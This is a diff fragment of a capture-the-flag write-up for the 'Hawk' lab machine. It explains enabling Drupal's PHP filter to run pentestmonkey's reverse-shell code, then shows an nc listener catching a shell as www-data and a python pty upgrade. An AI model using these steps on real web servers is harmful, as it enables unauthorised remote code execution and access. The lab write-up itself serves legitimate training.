@@ -134,3 +134,19 @@ Password : **PencilKeyboardScanner123**
 
 Once you are logged in you have to go to modules, and activate **PHP filter**.<br/>
 Once you have activated the module go to **Content, add content, Basic page, and put your PHP code**, go take the code pentestmonkey. :)
+
+AND BIM !!!
+
+    root@Seyptoo:~/writeup/hawk/go-openssl-bruteforce# nc -lvp 1234
+    Listening on [0.0.0.0] (family 0, port 1234)
+    Connection from [10.10.10.102] port 1234 [tcp/*] accepted (family 2, sport 48804)
+    Linux hawk 4.15.0-23-generic #25-Ubuntu SMP Wed May 23 18:02:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+     11:09:02 up 29 min,  2 users,  load average: 0.05, 0.02, 0.00
+    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+    daniel   pts/0    10.10.15.190     10:47    5:31   0.14s  0.14s -python3
+    daniel   pts/2    10.10.15.190     11:04    4:13   0.03s  0.03s -python3
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    /bin/sh: 0: can't access tty; job control turned off
+    $ python3 -c "import pty;pty.spawn('/bin/bash')"
+    www-data@hawk:/$
+    
